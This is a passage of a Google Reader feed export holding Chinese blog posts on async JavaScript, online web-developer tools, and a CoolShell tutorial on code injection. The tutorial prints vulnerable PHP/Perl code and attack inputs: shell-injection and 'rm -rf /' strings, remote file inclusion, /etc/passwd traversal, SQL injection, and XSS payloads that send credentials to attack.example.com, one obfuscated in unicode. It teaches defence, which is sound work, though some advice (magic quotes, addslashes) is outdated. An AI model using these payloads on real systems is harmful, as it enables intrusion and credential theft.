500);</p>\n\n<p>　　　　<strong>return dfd.promise;</strong></p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>这样写的优点在于，回调函数变成了链式写法，程序的流程可以看得很清楚，而且有一整套的<a href=\"http://api.jquery.com/category/deferred-object/\">配套方法</a>，可以实现许多强大的功能。</p>\n\n<p>比如，指定多个回调函数：</p>\n\n<blockquote>\n\n<p>　　f1().then(f2).then(f3);</p>\n\n</blockquote>\n\n<p>再比如，指定发生错误时的回调函数：</p>\n\n<blockquote>\n\n<p>　　f1().then(f2).fail(f3);</p>\n\n</blockquote>\n\n<p>而且，它还有一个前面三种方法都没有的好处：如果一个任务已经完成，再添加回调函数，该回调函数会立即执行。所以，你不用担心是否错过了某个事件或信号。这种方法的缺点就是编写和理解，都相对比较难。</p>\n\n<p><strong>五、参考链接</strong></p>\n\n<p>　　* <a href=\"http://sporto.github.com/blog/2012/12/09/callbacks-listeners-promises/\">Asynchronous JS: Callbacks, Listeners, Control Flow Libs and Promises</a></p>\n\n<p>（完）</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2012/12/asynchronous%EF%BC%BFjavascript.html\">http://www.ruanyifeng.com/blog/2012/12/asynchronous＿javascript.html</a></li>\n<li>最后修改时间：2013年1月23日 13:51</li>\n<li>付费支持：<a href=\"https://me.alipay.com/ruanyf\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" title=\"人民币\" alt=\"人民币 - 支付宝\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.99&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"美元 - paypal\" title=\"美元\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;margin:1em;border-radius:10px\"><p><strong>[广告]</strong>　<a href=\"http://www.fsz.cn/?utm_source=ruanyifeng.com\" style=\"border:none\">发烧族（Flash Sale Zone）挖掘网购信息，提供各类特价、限时抢购、秒杀、白菜价、1元包邮甚至0元包邮信息的网站。</a>\n</p></div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1355918009062",
    "timestampUsec" : "1355918009062464",
    "id" : "tag:google.com,2005:reader/item/9f63f9264ea51f78",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Web开发", "杂项资源", "编程工具", "AutoTools", "HTTP", "http load", "test", "Web" ],
    "title" : "Web工程师的工具箱",
    "published" : 1355846683,
    "updated" : 1355846683,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/8767.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p><img alt=\"Web Toolbox\" src=\"http://coolshell.cn//wp-content/uploads/2012/12/webtoolbox.jpg\" width=\"318\" height=\"196\">本文出自<a href=\"http://ivanzuzak.info/\">Ivan Zuzak</a> 的《<a href=\"http://ivanzuzak.info/2012/11/18/the-web-engineers-online-toolbox.html\">The Web engineer’s online toolbox</a>》，作者给了一个各种可以用来进行开发、测试、调试以及文档编排的在线工具集。（注：我发现CSDN上已经有了这篇文章《<a href=\"http://www.csdn.net/article/2012-11-19/2811992\">Web工程师必备的18款工具</a>》，但可惜的是这篇文章并不全（原文后来被更新到了33个工具），而且其中并没有包括原文评论中出现的所有工具，所以，我一并补全了更出来，一共40多个工具）</p>\n<h4><strong>Web工程师在线工具箱</strong></h4>\n<ul>\n<li><a href=\"http://requestb.in/\"><strong>RequestBin</strong></a><strong>：</strong>允许你创建一个URL，利用这款工具进行收集请求，然后通过个性化方式进行检查。</li>\n</ul>\n<ul>\n<li><a href=\"http://hurl.it/\"><strong>Hurl</strong></a><strong>：</strong>发出HTTP请求，输入URL，设置标题，查看响应，最后分享给其他人。类似的工具有：<a href=\"http://resttesttest.com/\">REST test test</a>, <a href=\"https://apigee.com/console/others\">Apigee console</a>.。</li>\n</ul>\n<ul>\n<li><a href=\"http://httpbin.org/\"><strong>Httpbin</strong></a><strong>：</strong>HTTP请求&amp;响应服务，涵盖所有的HTTP方案（例如不同的HTTP verbs、状态代码和重定向）。类似工具：<a href=\"http://ivanzuzak.info/urlecho/\">UrlEcho</a>。</li>\n</ul>\n<ul>\n<li><a href=\"http://redbot.org/\"><strong>REDbot</strong></a><strong>：</strong>这是一个机器人工具，帮助用户检查HTTP资源，可查看它的操作情况，指出常见的问题并提出改进。类似工具：<a href=\"http://zamez.org/httplint\">HTTP lint</a>。</li>\n</ul>\n<ul>\n<li><a href=\"http://webgun.io/\"><strong>WebGun</strong></a><strong>：</strong>用于创建webhooks模板的API。类似工具：<a href=\"https://github.com/izuzak/urlreq\">UrlReq</a>。</li>\n</ul>\n<ul>\n<li><strong><a href=\"https://www.webscript.io/\">Webscript</a> </strong> 自选一个url，填一段Lua代码，就能对访问做各种respond，还可以主动运行任务，cron job等等…</li>\n</ul>\n<p><span></span></p>\n<ul>\n<li><strong><a href=\"http://www.clickhooks.com/\">ClickHooks</a> </strong>这是一个短网址服务， 当用户访问了你的这个短网址跳转链接，服务器会通过HTTP POST的方式回调你的一个URL。这也是一种WebHooks方式。（陈皓注：所谓WebHooks，你可以理解为一种trigger，或是一种handler，比如当你你提交了代码，会调用某个URL链接以POST的方式告诉那个网站你提交了代码（如：发一个twitter 之类的，或是通知某个bug tracker系统））</li>\n</ul>\n<ul>\n<li><strong><a href=\"http://mailhooks2.appspot.com/\">MailHooks</a> </strong>让你可以通过HTTP POST方法收电子邮件（又叫WebHooks），你可以为你的一个邮件地址创建N多的hooks，当一个邮件收到了，可以把这个邮件以POST的方式发到你的某个URL上去。</li>\n</ul>\n<ul>\n<li><strong><a href=\"http://a.quil.la/\">Quilla</a> </strong>提供一个人们可以找到你的短网站服务，在那里，当人们提交到你的短网址上的请求会给你发邮件。好像是一种HTTP到SMTP的代理服务。</li>\n</ul>\n<ul>\n<li><a href=\"http://apify.heroku.com/resources\"><strong>Apify</strong></a><strong>：</strong>公开锁定在HTML文档没有任何API数据集。APIfy从结构标记中提取数据，并将其转换为JSON APIs。</li>\n</ul>\n<ul>\n<li><a href=\"http://validator.w3.org/unicorn/\"><strong>Unicorn</strong></a><strong>：</strong>W3C统一的验证程序，可在各种流行的HTML和CSS验证器中执行各种检查。类似工具：<a href=\"http://lint.brihten.com/html/\">HTML lint</a>。</li>\n</ul>\n<ul>\n<li><strong><a href=\"http://jsonlint.com/\">JSONLint</a> </strong>JSON 格式验证程序</li>\n</ul>\n<ul>\n<li><a href=\"http://validator.w3.org/feed/\"><strong>Feed validator</strong></a><strong>：</strong>支持W3C验证，为RSS和ATOM提供阅读源。</li>\n</ul>\n<ul>\n<li><a href=\"http://validator.w3.org/checklink\"><strong>Link checker</strong></a><strong>：</strong>从网站中提取链接（递归）并确保没有链接被定义为两次（重复定义），所有的链接被引用并警告HTTP重新定向。</li>\n</ul>\n<ul>\n<li><a href=\"http://www.host-tracker.com/\"><strong>Host tracker</strong></a><strong>：</strong>通过分布式ping/跟踪检查、定期监测、邮件/SMS /IM通知和统计进行网站检测性服务。类似工具有：<a href=\"http://www.downforeveryoneorjustme.com/\">Down for everyone or just me</a>, <a href=\"http://tools.pingdom.com/ping/\">Pimgdom ping service</a></li>\n</ul>\n<ul>\n<li><strong><a href=\"http://www.viewdns.info/\">ViewDNS</a> </strong>一组 DNS 和网络工具，如：反向IP解析，DNS记录查询或traceroute之类的。</li>\n</ul>\n<ul>\n<li><strong><a href=\"http://www.necrohost.com/\">Necrohost</a>  </strong>一个URL列表来模拟不同网络链接的问题，如：响应慢，无法解析DNS，或是404什么的。</li>\n</ul>\n<ul>\n<li><strong><a href=\"https://code.google.com/p/mirrorrr/\">Mirrorrr</a>  </strong>一个可以用来镜像某网页的应用（经常被国人用来搞Web 代理来翻墙）。</li>\n</ul>\n<ul>\n<li><strong><a href=\"http://certlogik.com/ssl-checker/\">SSL Checker</a>  </strong>测试SSL认证</li>\n</ul>\n<ul>\n<li><strong><a href=\"http://certlogik.com/decoder/\">CSR/Cert decoder</a>  </strong>对你的CSR和SSL认证decode检查。</li>\n</ul>\n<ul>\n<li><strong><a href=\"http://loadzen.com/\">Loadzen</a>  </strong>Web压力测试工具（注：以前酷壳介绍过《<a href=\"http://coolshell.cn/articles/2589.html\">十个Web压力测试工具</a>》）</li>\n</ul>\n<ul>\n<li><a href=\"http://tools.pingdom.com/fpt/\"><strong>Pingdom Full page test</strong></a><strong>：</strong>允许用户测试网页记载时间、分析、监控，发现瓶颈并导出HAR格式的结果。类似工具：<a href=\"http://www.webpagetest.org/\">Web page test</a>。</li>\n</ul>\n<ul>\n<li><strong><a href=\"https://developers.google.com/speed/pagespeed/insights\">Google PageSpeed Insights</a> </strong>Analyzes the content of a web page, then generates suggestions to make that page faster.</li>\n</ul>\n<ul>\n<li><a href=\"http://www.softwareishard.com/har/viewer/\"><strong>HAR viewer</strong></a><strong>：</strong>通过 HTTP 追踪工具创建可视化的HTTP Archive (HAR)日志文件。</li>\n</ul>\n<ul>\n<li><a href=\"http://www.corsproxy.com/\"><strong>CORS proxy</strong></a><strong>：</strong>通常会由于相同的域而被阻止，而这款工具在网站上允许JavaScript代码访问其他域上的资源，</li>\n</ul>\n<ul>\n<li><a href=\"https://browserling.com/\"><strong>Browserling</strong></a><strong>：</strong>支持使用所有主要浏览器以及各种版本进行交互式跨浏览器测试。</li>\n</ul>\n<ul>\n<li><a href=\"http://www.websocket.org/echo.html\"><strong>WebSocket Echo Test</strong></a><strong>:</strong> 从浏览器定向到WebSocket echo服务器进行WebSocket连接测试。</li>\n</ul>\n<ul>\n<li><a href=\"http://developer.yahoo.com/yql/\"><strong>YQL</strong></a><strong>：</strong>极富表现力类似于SQL的语言，允许您查询、筛选和联接数据跨Web服务。</li>\n</ul>\n<ul>\n<li><strong><a href=\"http://webshell.io/\">Webshell</a> </strong>使用命令行脚本的方式来调用一些Web API。</li>\n</ul>\n<ul>\n<li><a href=\"http://pipes.yahoo.com/pipes/\"><strong>Yahoo Pipes</strong></a><strong>：</strong>一个图形化的用户界面，用于创建数据混搭，生成聚合Web源，Web页面和其他服务。</li>\n</ul>\n<ul>\n<li><a href=\"http://apiary.io/\"><strong>Apiary</strong></a><strong>：</strong>语言和工具用于生成REST API文档及进行交互式督查。类似工具：<a href=\"http://swagger.wordnik.com/\">Swagger</a>。</li>\n</ul>\n<ul>\n<li><strong><a href=\"http://jsfiddle.net/\">JSFiddle</a>  </strong>一个在线的代码编辑可以让你编译一些HTML, CSS 和 JavaScript的东西，并演示之。相似工具: <a href=\"http://jsbin.com/\">JSBin</a></li>\n</ul>\n<ul>\n<li><a href=\"https://developers.google.com/feed/v1/jsondevguide\">Google Feed API</a> 你可以使用这个API来查询有RSS Feed的网站 (<a href=\"http://ajax.googleapis.com/ajax/services/feed/lookup?v=1.0&amp;q=http://ivanzuzak.info/\">example</a>)，或是搜索有RSS Feed(<a href=\"https://ajax.googleapis.com/ajax/services/feed/find?v=1.0&amp;q=ivan%20zuzak\">example</a>) ，或是把JSON变成一个JSON返回 (<a href=\"https://ajax.googleapis.com/ajax/services/feed/load?v=1.0&amp;q=http://ivanzuzak.info/atom.xml\">example</a>)</li>\n</ul>\n<h4>未在列表的工具</h4>\n<ul>\n<li><a href=\"http://www.fiddler2.com/fiddler2/\">Fiddler</a> – 可能是最强大最好用的Web调试工具之一，它能记录所有客户端和服务器的http和https请求，允许你监视，设置断点，甚至修改输入输出数据. 使用Fiddler无论对开发还是测试来说，都有很大的帮助。.</li>\n</ul>\n<ul>\n<li><a href=\"http://grids.heroku.com/\">960 grid system generator</a> 和 <a href=\"http://meyerweb.com/eric/tools/css/reset/\">CSS reset</a> – 两个关注于Web站点设计的工具。</li>\n</ul>\n<ul>\n<li><a href=\"http://www.nuvolabase.com/site/index.html\">NuvolaBase</a> – 一个可以共享个人私有数据的解决方案。正如作者所说，这不是一个开发工具。</li>\n</ul>\n<ul>\n<li><a href=\"https://openexchangerates.org/\">Open exchange rates</a> – 一个和汇率货币相关的JSON式的API。这样的API你可以到 <a href=\"http://www.programmableweb.com/\">Programmable Web</a> 上查找。</li>\n</ul>\n<ul>\n<li><a href=\"https://workflowy.com/\">Workflowy</a>, <a href=\"http://www.lastcalc.com/\">LastCalc</a>, <a href=\"http://codepad.org/\">Codepad</a>, <a href=\"http://www.mailinator.com/\">Mailinator</a> and <a href=\"http://10minutemail.com/\">10MinuteMail</a>, <a href=\"https://onetimesecret.com/\">One time secret</a> and <a href=\"http://copypastecharacter.com/\">CopyPasteCharacter</a> – 这些App似乎和Web开发没什么关系。</li>\n</ul>\n<ul>\n<li><a href=\"https://browsershots.org/\">Browsershots</a> – 一个用来测试网页在不同平台下的工具。（参看）</li>\n</ul>\n<ul>\n<li><a href=\"http://scriptular.com/\">Scriptular</a> and <a href=\"http://rubular.com/\">Rubular</a> – 正则表达式工具，这样的工具太多了，如： <a href=\"http://refiddle.com/\">ReFiddle</a>, <a href=\"http://regexpal.com/\">Regex pal</a> and <a href=\"http://www.txt2re.com/\">Txt2Re</a>。</li>\n</ul>\n<p>（全文完）\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:14px;margin-bottom:50px\">——=== <b>访问 <a href=\"http://coolshell.cn/404/\">酷壳404页面</a> 以支持公益事业</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li>2010年07月13日 -- <a href=\"http://coolshell.cn/articles/2589.html\">十个免费的Web压力测试工具</a></li><li>2012年11月20日 -- <a href=\"http://coolshell.cn/articles/8593.html\">如何测试洗牌程序</a></li><li>2012年07月19日 -- <a href=\"http://coolshell.cn/articles/7917.html\">各式各样的验证码</a></li><li>2012年12月10日 -- <a href=\"http://coolshell.cn/articles/8711.html\">程序员疫苗：代码注入</a></li><li>2012年08月27日 -- <a href=\"http://coolshell.cn/articles/8170.html\">一次Ajax查错的经历</a></li><li>2011年06月07日 -- <a href=\"http://coolshell.cn/articles/4787.html\">HTTP幂等性概念和应用</a></li><li>2011年01月18日 -- <a href=\"http://coolshell.cn/articles/3480.html\">一些有意思的网站和贴子</a></li><li>2009年09月27日 -- <a href=\"http://coolshell.cn/articles/1480.html\">非常简单的Python HTTP服务</a></li></ul><div><a href=\"http://www.zemanta.com/?wp-related-posts\">Zemanta</a></div></div></div></p>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1355107164637",
    "timestampUsec" : "1355107164637563",
    "id" : "tag:google.com,2005:reader/item/4781772a91a31621",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Web开发", "网络安全", "CRSF", "SQL", "Web", "XSS", "安全" ],
    "title" : "程序员疫苗：代码注入",
    "published" : 1355099688,
    "updated" : 1355099688,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/8711.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p><img title=\"程序员疫苗\" src=\"http://coolshell.cn//wp-content/uploads/2012/12/200906020837401710.jpg\" alt=\"\" width=\"245\" height=\"206\">几个月在<a href=\"http://weibo.com/haeol\">我的微博</a>上说过要建一个程序员疫苗网站，希望大家一起来提交一些错误示例的代码，来帮助我们新入行的程序员，不要让我们的程序员一代又一代的再重复地犯一些错误。很多程序上错误就像人类世界的病毒一样，我们应该给我们的新入行的程序员注射一些疫苗，就像给新生儿打疫苗一样，希望程序员从入行时就对这些错误有抵抗力。</p>\n<p>我的那个疫苗网站正在建议中（不好意思拖了很久），不过，我可以先写一些关于程序员疫苗性质的文章，也算是热热身。希望大家喜欢，先向大家介绍第一注疫苗——代码注入。</p>\n<h4>Shell注入</h4>\n<p>我们先来看一段perl的代码：</p>\n<pre>use CGI qw(:standard);\n$name = param(&#39;name&#39;);\n$nslookup = &quot;/path/to/nslookup&quot;;\nprint header;\nif (open($fh, &quot;$nslookup $name|&quot;)) {\n    while (&lt;$fh&gt;) {\n        print escapeHTML($_);\n        print &quot;&lt;br&gt;\\n&quot;;\n    }\n    close($fh);\n}</pre>\n<p>如果用户输入的参数是：</p>\n<pre>coolshell.cn%20%3B%20/bin/ls%20-l</pre>\n<p>那么，这段perl的程序就成了：</p>\n<p><span></span></p>\n<pre>/path/to/nslookup coolshell.cn ; /bin/ls -l</pre>\n<p>我们再来看一段PHP的程序：</p>\n<pre>$myvar = 'somevalue';\n$x = $_GET['arg'];\neval('$myvar = ' . $x . ';');</pre>\n<p>“<code>eval</code>“的参数将会视同PHP处理，所以额外的命令可被添加。例如：如果”arg”如果被设成”<code>10; system('rm -rf /')</code>“，后面的”<code>system('rm -rf /')</code>“代码将被运行，这等同在服务器上运行开发者意料外的程序。（关于rm -rf /，你懂的，可参看“<a title=\"一个空格引发的惨剧\" href=\"http://coolshell.cn/articles/4875.html\">一个空格引发的悲剧</a>”）</p>\n<p>再来看一个PHP的代码</p>\n<pre>$isadmin= false;\n...\n...\nforeach ($_GET as $key =&gt; $value) {\n  $$key = $value;\n}</pre>\n<p>如果攻击者在查询字符串中给定”isadmin=1″，那$isadmin将会被设为值 “1″，然后攻击值就取得了网站应用的admin权限了。</p>\n<p>再来看一个PHP的示例：</p>\n<pre>$action = 'login';\n   if (__isset( $_GET['act'] ) )\n      $action = $_GET['act'];\n   require( $action . '.php' ); </pre>\n<p>这个代码相当危险，攻击者有可能可以干这些事：</p>\n<ul>\n<li><code>/test.php?act=<strong>http://evil/exploit</strong></code> - 注入远程机器上有漏洞的文件。</li>\n<li><code>/test.php?act=<strong>/home/www/bbs/upload/exploit</strong></code> - 从一个已经上载、叫做exploit.php文件运行其代码。</li>\n<li><code>/test.php?act=<strong>../../../../etc/passwd%00</strong></code> - 让攻击者取得该UNIX系统目录检索下密码文件的内容。一个使用空元字符以解除<code>.php</code>扩展名限制，允许访问其他非 .php 结尾文件。 (PHP默认值”magic_quotes_gpc = On”可以终止这种攻击)</li>\n</ul>\n<p>这样的示例有很多，只要你的程序有诸如：<code>system()</code>、<code>StartProcess()</code>、<code>java.lang.Runtime.exec()</code>、<code>System.Diagnostics.Process.Start()</code>以及类似的应用程序接口，都是比较危险的，最好不要让其中的字符串去拼装用户的输入。</p>\n<p>PHP提供<code><a href=\"http://www.php.net/manual/en/function.escapeshellarg.php\" rel=\"nofollow\">escapeshellarg()</a></code>和<code><a href=\"http://www.php.net/manual/en/function.escapeshellcmd.php\" rel=\"nofollow\">escapeshellcmd()</a></code>以在调用方法以前进行编码。然而，实际上并不建议相信这些方法是安全的 。</p>\n<h4>SQL注入</h4>\n<p>SQL injection，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏。</p>\n<p>在应用程序中若有下列状况，则可能应用程序正暴露在SQL Injection的高风险情况下：</p>\n<ol>\n<li>在应用程序中使用字符串联结方式组合SQL指令（如：引号没有转义）。</li>\n<li>在应用程序链接数据库时使用权限过大的帐户（如：很多开发人员都喜欢用sa（最高权限的系统管理员帐户）连接Microsoft SQL Server数据库）。</li>\n<li>在数据库中开放了不必要但权力过大的功能（例如在Microsoft SQL Server数据库中的xp_cmdshell延伸预存程序或是OLE Automation预存程序等）</li>\n<li>过于信任用户所输入的数据，未限制输入的字符数，以及未对用户输入的数据做潜在指令的检查。</li>\n</ol>\n<p>例程：</p>\n<p>某个网站的登录验证的SQL查询代码为</p>\n<div dir=\"ltr\">\n<div>\n<pre>strSQL = &quot;SELECT * FROM users\nWHERE (name = &#39;&quot; + userName + &quot;&#39;) and (pw = &#39;&quot;+ passWord +&quot;&#39;);&quot;</pre>\n</div>\n</div>\n<p>用户在登录时恶意输入如下的的用户名和口令：</p>\n<div dir=\"ltr\">\n<div>\n<pre>userName = &quot;&#39; OR &#39;1&#39;=&#39;1&quot;;</pre>\n</div>\n</div>\n<div dir=\"ltr\">\n<div>\n<pre>passWord = &quot;&#39; OR &#39;1&#39;=&#39;1&quot;;</pre>\n</div>\n</div>\n<p>此时，将导致原本的SQL字符串被解析为：</p>\n<div dir=\"ltr\">\n<div>\n<pre>strSQL = &quot;SELECT * FROM users\nWHERE (name = &#39;&#39; OR &#39;1&#39;=&#39;1&#39;) and (pw = &#39;&#39; OR &#39;1&#39;=&#39;1&#39;);&quot;</pre>\n</div>\n</div>\n<p>也就是实际上运行的SQL命令会变成下面这样的，因此导致无帐号密码，也可登录网站。</p>\n<div dir=\"ltr\">\n<div>\n<pre>strSQL = &quot;SELECT * FROM users;&quot;</pre>\n</div>\n</div>\n<p>这还不算恶劣的，真正恶劣的是在你的语句后再加一个自己的语句，如：</p>\n<pre>username= &quot;&#39; ; DELETE FROM users; --&quot;;</pre>\n<p>这样一来，要么整个数据库的表被人盗走，要么被数据库被删除。</p>\n<p><strong>所以SQL注入攻击被俗称为黑客的填空游戏</strong>。你是否还记得酷壳<a title=\"千万别惹程序员\" href=\"http://coolshell.cn/articles/6639.html\">这篇文章里的SQL注入</a>？</p>\n<p><img title=\"SQL-injection-attack(adjusted)\" src=\"http://coolshell.cn//wp-content/uploads/2012/02/SQL-injection-attackadjusted.jpg\" alt=\"\" width=\"600\" height=\"407\"></p>\n<p>当他们发现一个网站有SQL注入的时候，他们一般会干下面的事：</p>\n<ul>\n<li>盗取数据表中的数据，例如个人机密数据（信用卡，身份证，手机号，通讯录……），帐户数据，密码等，获得用户的数据和信息后对这些用户进行“社会工程学”活动（如：<a title=\"为什么不能用微信或米聊这类的软件\" href=\"http://coolshell.cn/articles/8638.html\">我前两天在微信上亲身经历</a>）。</li>\n</ul>\n<ul>\n<li>取得系统管理员权限（例如ALTER LOGIN sa WITH PASSWORD=’xxxxxx’）。</li>\n</ul>\n<ul>\n<li>在数据库中的数据中插入一些HTML/JS代码，有可能得以在网页加入恶意链接以及XSS，这样一来就让访问者被黑。</li>\n</ul>\n<ul>\n<li>经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如：MS SQL Server的 xp_cmdshell “net stop iisadmin”可停止服务器的IIS服务）。甚至破坏硬盘数据，瘫痪全系统（例如xp_cmdshell “FORMAT C:”）。</li>\n</ul>\n<div>现在的黑客比较坏，瘫痪系统的事，他们干的越来越少，因为没什么利益，他们希望通过获取用户的帐号信息后，转而攻击用户别的帐号，如游戏帐号，网银帐号，QQ帐号等等他们可以获利的事情（这就是为什么我希望大家<a title=\"如何管理并设计你的口令\" href=\"http://coolshell.cn/articles/2428.html\">在不站点上使用不同的口令</a>，甚至不同的用户信息的原因）</div>\n<p><strong>如何避免</strong></p>\n<ul>\n<li>在组合SQL字符串时，先针对所传入的参数作字符转义（如：将单引号字符取代为连续2个单引号字符）。如果使用PHP开发网页程序的话，亦可打开PHP的Magic quote功能自动将所有的网页传入参数，将单引号字符取代为连续2个单引号字符。<strong>如果可能应该过滤以下字符：分号“;”，两个减号“–”，单引号“’”，注释“/* … */”</strong>。（当然，因为注入攻击一般用闭合的引号来玩，所以把引号转义了应该就没有什么问题了）</li>\n</ul>\n<ul>\n<li>更换危险字符。例如在PHP通过<code>addslashes()</code>函数保护SQL注入。</li>\n</ul>\n<ul>\n<li>限制用户输入的长度，限制用户输入的取值范围。</li>\n</ul>\n<ul>\n<li>为当前应用建立权限比较小的数据库用户，这样不会导致数据库管理员丢失。</li>\n</ul>\n<ul>\n<li>把数据库操作封装成一个Service，对于敏感数据，对于每个客户端的IP，在一定时间内每次只返回一条记录。这样可以避免被拖库。</li>\n</ul>\n<h4></h4>\n<h4>跨网站脚本注 入</h4>\n<p><strong>跨网站脚本</strong>（<strong>Cross-site</strong> scripting，通常简称为XSS或跨站脚本或跨站脚本攻击）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java， VBScript， ActiveX， Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>\n<p>假如我们有这样一段PHP的代码：</p>\n<pre>$username = $_GET[&#39;username&#39;];\necho &#39;&lt;div&gt; Welcome, &#39; . $username . &#39;&lt;/div&gt;&#39;;</pre>\n<p>那么我们可以这样来注入：</p>\n<div style=\"color:#1b00aa;background-color:#efefef;border:1px solid #dde2f5;font-size:90%;padding:10px\">http://trustedSite.example.com/welcome.php?username=&lt;Script Language=”Javascript”&gt;alert(“You’ve been attacked!”);&lt;/Script&gt;</div>\n<p>甚至这样：</p>\n<div style=\"color:#1b00aa;background-color:#efefef;border:1px solid #dde2f5;font-size:90%;padding:10px\">http://trustedSite.example.com/welcome.php?username=&lt;div id=”stealPassword”&gt;Please Login:&lt;form name=”input” action=”http://attack.example.com/stealPassword.php” method=”post”&gt;Username: &lt;input type=”text” name=”username” /&gt;&lt;br/&gt;Password: &lt;input type=”password” name=”password” /&gt;&lt;input type=”submit” value=”Login” /&gt;&lt;/form&gt;&lt;/div&gt;</div>\n<p>这会让网页显示以下内容：</p>\n<pre>\n&lt;div class=&quot;header&quot;&gt; Welcome,\n    &lt;div id=&quot;stealPassword&quot;&gt;Please Login:\n        &lt;form name=&quot;input&quot; action=&quot;attack.example.com/stealPassword.php&quot; method=&quot;post&quot;&gt;\n            Username: &lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;\n            &lt;br/&gt;\n            Password: &lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;\n            &lt;input type=&quot;submit&quot; value=&quot;Login&quot; /&gt;\n        &lt;/form&gt;\n    &lt;/div&gt;\n&lt;/div&gt;\n</pre>\n<p>注入的代码还有可能变种为如下这种更为隐蔽的方式(unicode码)：</p>\n<div style=\"color:#1b00aa;background-color:#efefef;border:1px solid #dde2f5;font-size:90%;padding:10px\">\n<div>trustedSite.example.com/welcome.php?username=&lt;script+type=”text/javascript”&gt;</div>\n<div>document.write(‘\\u003C\\u0064\\u0069\\u0076\\u0020\\u0069\\u0064\\u003D\\u0022\\u0073</div>\n<div>\\u0074\\u0065\\u0061\\u006C\\u0050\\u0061\\u0073\\u0073\\u0077\\u006F\\u0072\\u0064</div>\n<div>\\u0022\\u003E\\u0050\\u006C\\u0065\\u0061\\u0073\\u0065\\u0020\\u004C\\u006F\\u0067</div>\n<div>\\u0069\\u006E\\u003A\\u003C\\u0066\\u006F\\u0072\\u006D\\u0020\\u006E\\u0061\\u006D</div>\n<div>\\u0065\\u003D\\u0022\\u0069\\u006E\\u0070\\u0075\\u0074\\u0022\\u0020\\u0061\\u0063</div>\n<div>\\u0074\\u0069\\u006F\\u006E\\u003D\\u0022\\u0068\\u0074\\u0074\\u0070\\u003A\\u002F</div>\n<div>\\u002F\\u0061\\u0074\\u0074\\u0061\\u0063\\u006B\\u002E\\u0065\\u0078\\u0061\\u006D</div>\n<div>\\u0070\\u006C\\u0065\\u002E\\u0063\\u006F\\u006D\\u002F\\u0073\\u0074\\u0065\\u0061</div>\n<div>\\u006C\\u0050\\u0061\\u0073\\u0073\\u0077\\u006F\\u0072\\u0064\\u002E\\u0070\\u0068</div>\n<div>\\u0070\\u0022\\u0020\\u006D\\u0065\\u0074\\u0068\\u006F\\u0064\\u003D\\u0022\\u0070</div>\n<div>\\u006F\\u0073\\u0074\\u0022\\u003E\\u0055\\u0073\\u0065\\u0072\\u006E\\u0061\\u006D</div>\n<div>\\u0065\\u003A\\u0020\\u003C\\u0069\\u006E\\u0070\\u0075\\u0074\\u0020\\u0074\\u0079</div>\n<div>\\u0070\\u0065\\u003D\\u0022\\u0074\\u0065\\u0078\\u0074\\u0022\\u0020\\u006E\\u0061</div>\n<div>\\u006D\\u0065\\u003D\\u0022\\u0075\\u0073\\u0065\\u0072\\u006E\\u0061\\u006D\\u0065</div>\n<div>\\u0022\\u0020\\u002F\\u003E\\u003C\\u0062\\u0072\\u002F\\u003E\\u0050\\u0061\\u0073</div>\n<div>\\u0073\\u0077\\u006F\\u0072\\u0064\\u003A\\u0020\\u003C\\u0069\\u006E\\u0070\\u0075</div>\n<div>\\u0074\\u0020\\u0074\\u0079\\u0070\\u0065\\u003D\\u0022\\u0070\\u0061\\u0073\\u0073</div>\n<div>\\u0077\\u006F\\u0072\\u0064\\u0022\\u0020\\u006E\\u0061\\u006D\\u0065\\u003D\\u0022</div>\n<div>\\u0070\\u0061\\u0073\\u0073\\u0077\\u006F\\u0072\\u0064\\u0022\\u